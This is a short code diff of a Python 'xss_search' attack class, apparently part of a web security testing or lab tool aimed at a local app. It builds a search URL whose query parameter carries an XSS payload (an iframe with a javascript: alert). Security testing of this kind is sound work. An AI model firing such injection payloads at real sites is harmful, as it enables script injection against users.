@@ -3,13 +3,14 @@ from . import attack as a
 class xss_search(a.attack_inter):
     def __init__(self, script=None):
         self.script = script
+        self.url = a.URL + '/#/search'
         
 
     def generator(self, myScript='<iframe src="javascript:alert(\'xss\')">'):
         #base_url = 'http://localhost:3000/rest/products/search'
-        base_url = 'http://localhost:3000/#/search'
+        
         params = '?q='+myScript  
-        return base_url, params
+        return self.url, params
 
     def run(self):
         if self.script:
